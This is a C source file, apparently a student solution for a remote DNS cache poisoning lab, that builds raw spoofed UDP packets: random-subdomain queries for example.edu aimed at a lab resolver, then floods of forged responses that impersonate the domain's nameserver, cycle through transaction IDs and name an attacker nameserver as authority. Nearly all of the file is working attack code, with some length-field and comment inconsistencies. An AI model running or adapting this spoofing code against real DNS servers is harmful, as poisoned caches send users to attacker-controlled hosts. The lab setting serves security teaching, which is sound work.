// ----udp.c------
// For use with the Remote DNS Cache Poisoning Attack Lab
// Sample program used to spoof lots of different DNS queries to the victim.
//
// Wireshark can be used to study the packets, however, the DNS queries 
// sent by this program are not enough for to complete the lab.
//
// The response packet needs to be completed.
//
// Compile command:
// gcc udp.c -o udp
//
// The program must be run as root
// sudo ./udp

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>

#include<pcap.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// The IP header's structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;

};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum((uint16_t *)&(tempI->iph_sourceip),8);
    sum+=checksum((uint16_t *)tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC791,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[])
{
    // This is to check the argc number
    //if(argc != 3){
    //    printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
    //    exit(-1);
    //}

    char *DNS_SERVER_IP = "192.168.15.9";
    char *ATTACKER_MACHINE_IP = "192.168.15.11";
    char *EXAMPLE_EDU_NS_SERVER_IP = "199.43.133.53";


    // socket descriptor
    int sd;
    // buffer to hold the packet
    char buffer[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

    //The flag you need to set
    dns->flags=htons(FLAG_Q);
    
    //only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);

    //query string
    strcpy(data,"\5aaaaa\7example\3edu");
    int length= strlen(data)+1;

    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    /*************************************************************************************
      Construction of the packet is done. 
      now focus on how to do the settings and send the packet we have composed out
     ***************************************************************************************/
    
    // Source and destination addresses: IP and port
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random #
    //dns->query_id = 5000;
    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(DNS_SERVER_IP); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(ATTACKER_MACHINE_IP); // this is the first argument we input into the program

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(ATTACKER_MACHINE_IP);

    // The destination IP address
    ip->iph_destip = inet_addr(DNS_SERVER_IP);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(33333);  // source port number. remember the lower number may be reserved
    
    // Destination port number
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd));

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");	
        exit(-1);
    }

    //------------------------the above is for the query socket, and then will be the response socket-----------------------//
    int sd_res;
    char buffer_res[PCKT_LEN];
    memset(buffer_res,0,PCKT_LEN);
    struct ipheader *ip_res = (struct ipheader *)buffer_res;
    struct udpheader *udp_res = (struct udpheader *) (buffer_res + sizeof(struct ipheader));
    struct dnsheader *dns_res = (struct dnsheader *)(buffer_res + sizeof(struct ipheader)+sizeof(struct udpheader));
    char *data_res = (buffer_res + sizeof(struct ipheader)+sizeof(struct udpheader)
        +sizeof(struct dnsheader));
    
    dns_res->flags=htons(FLAG_R);
    dns_res->QDCOUNT=htons(1);
    dns_res->ANCOUNT=htons(1);
    dns_res->NSCOUNT=htons(1);
    dns_res->ARCOUNT=htons(1);

    strcpy(data_res, "\5aaaaa\7example\3edu");
    int len_res = strlen(data_res) +1;
    struct dataEnd *end_res = (struct dataEnd *)(data_res + len_res);
    end_res->type=htons(1);
    end_res->class=htons(1);
    int offset = sizeof(struct ipheader) + sizeof(struct udpheader) + 
        sizeof(struct dnsheader) + len_res + sizeof(struct dataEnd);
    char * answer_session = "0xc00c0001000102000000000401010101c01200020001020000000017026e730e646e736c616261747461636b6572036e657400026e730e646e736c616261747461636b6572036e65740000010001020000000004010101010000291000000080000000";
    int i;
    printf("string: %s\n", answer_session);
    int answer_len = strlen(answer_session) -2;
    for (i =0;i<answer_len;i+=2){
        //sscanf(&answer_session[i*2], "%2hhx", &buffer_res[offset_res +i]);
        char hex[3];
        hex[0] = answer_session[i+2];
        hex[1] = answer_session[i+3];
        hex[2] = '\0';

        int ascii_value;
        sscanf(hex,"%x",&ascii_value);
        buffer_res[offset + (i/2)] = (char) ascii_value;
        printf("%d char of normal string: %c\n", i/2, (char) ascii_value);
    }

    // then is about the network config
    struct sockaddr_in sin_res, din_res;
    sd_res = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd_res<0) // if socket fails to be created 
        printf("sd_response socket error\n");
    sin_res.sin_family = AF_INET;
    din_res.sin_family = AF_INET;
    sin_res.sin_port = htons(53); 
    din_res.sin_port = htons(33333);
    sin_res.sin_addr.s_addr = inet_addr(DNS_SERVER_IP);
    din_res.sin_addr.s_addr = inet_addr(EXAMPLE_EDU_NS_SERVER_IP);
    ip_res->iph_ihl = 5;
    ip_res->iph_ver = 4;
    ip_res->iph_tos = 0; // Low delay

    unsigned short int packetLength_res =(sizeof(struct ipheader) +
        sizeof(struct udpheader)+sizeof(struct dnsheader)+len_res+
        sizeof(struct dataEnd)+99); // length + dataEnd_size == UDP_payload_size

    ip_res->iph_len=htons(packetLength_res);
    ip_res->iph_ident = htons(rand()); // give a random number for the identification#
    ip_res->iph_ttl = 110; // hops
    ip_res->iph_protocol = 17; // UDP
    ip_res->iph_sourceip = inet_addr(EXAMPLE_EDU_NS_SERVER_IP);
    ip_res->iph_destip = inet_addr(DNS_SERVER_IP);
    udp_res->udph_srcport = htons(53);
    udp_res->udph_destport = htons(33333);
    udp_res->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+
        length+sizeof(struct dataEnd)+99);
    ip_res->iph_chksum = csum((unsigned short *)buffer_res, sizeof(struct ipheader) +
        sizeof(struct udpheader));
    udp_res->udph_chksum=check_udp_sum(buffer_res, 
        packetLength_res-sizeof(struct ipheader)); 
    if(setsockopt(sd_res, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");  
        exit(-1);
    }

    printf("buffer%s\n",buffer);
    printf("buffer res%s\n",buffer_res);

    //------------start use tcpdump to get the packet --------------------
    pcap_t *handle;
    char errbuf[2048];
    struct pcap_pkthdr header;
    const u_char *packet;
    handle = pcap_open_live("eth14", 2048, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", "eth0", errbuf);
        return 2;
    }
    pcap_dumper_t *dumpfile;
    dumpfile = pcap_dump_open(handle, "capture.pcap");
    

    int count, transID;
    while(1)
    {	
        // This is to generate a different query in xxxxx.example.edu
        //   NOTE: this will have to be updated to only include printable characters
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;
	* (data_res + charnumber) +=1;

        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));
    
        //Zilin start the response ppacket sending
        //sleep(1);
        transID = 3500;
        for(count=0; count<1000; count++){
	    //printf("start sending forged response packet, count is %d\n",count);
            dns_res -> query_id = transID + count;
            udp_res->udph_chksum=check_udp_sum(buffer_res, 
                packetLength_res-sizeof(struct ipheader));
            if(sendto(sd_res, buffer_res, packetLength_res, 0, (struct sockaddr *)&sin_res, sizeof(sin_res)) < 0)
                printf("packet send error %d which means %s\n",errno,strerror(errno));
            
            packet = pcap_next(handle, &header);
            if (packet == NULL) {
                printf("No packet found.\n");
            } else {
                pcap_dump((u_char *)dumpfile, &header, packet);
            }
      
        }

    
    }
    close(sd);
    close(sd_res);
    pcap_dump_close(dumpfile);
    pcap_close(handle);

    return 0;
}

